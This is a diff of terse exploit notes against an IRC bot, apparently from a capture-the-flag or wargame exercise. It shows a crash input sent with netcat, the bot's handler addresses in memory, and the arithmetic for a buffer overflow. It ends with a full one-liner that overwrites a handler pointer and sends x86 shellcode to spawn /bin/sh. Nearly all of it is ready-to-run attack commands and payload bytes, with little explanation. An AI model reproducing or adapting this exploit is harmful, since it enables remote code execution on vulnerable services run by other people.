@@ -1,2 +1,27 @@
 makes bot crash (MAX_CMD_LEN is 32, and the data is checked against that) :
 (  sleep 2 ; echo NICK $USER;  echo USER $USER $USER $USER :$USER;  sleep 1;  echo "JOIN $CHANNEL";  sleep 1;  echo "PRIVMSG $DEST" :`python -c 'print "!" + "X" * 42'`;  echo "QUIT";  ) | nc $IRC_SERVER $IRC_PORT
+
+handlers :
+0x8048917
+0x80488bb
+0x804893a
+0x80488f0
+
+next param :   0x804b120
+handler list : 0x804b160
+
+MAX_CMD_LEN  32
+
+objective : override one of the handler address to start of buff (in next_param)
+
+32 bytes buff
++ 32 bytes ??
++ (40 x 3) bytes (3 Handler structures)
+- 4 byte (override handler address of last structure)
+= 180 bytes (0xb4)
+
+0x804b120 (start of buff) + 0xb4 = 0x804b1d4
+
+// first, override join callback address
+
+(  sleep 2 ; echo NICK $USER;  echo USER $USER $USER $USER :$USER;  sleep 1;  echo "JOIN $CHANNEL";  sleep 1;  echo "PRIVMSG $DEST" :`python -c 'print "!" + "A"*139 + "\x21\xb1\x04\x08" + "PRIVMSG\x00"'`; echo "PRIVMSG $DEST" :`python -c 'print "!" + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "A"*65 + "PRIVMSG\x00"'` ; echo "PRIVMSG $DEST" :`python -c "print 'pls_crash'"` ; echo "QUIT";  ) | nc $IRC_SERVER $IRC_PORT
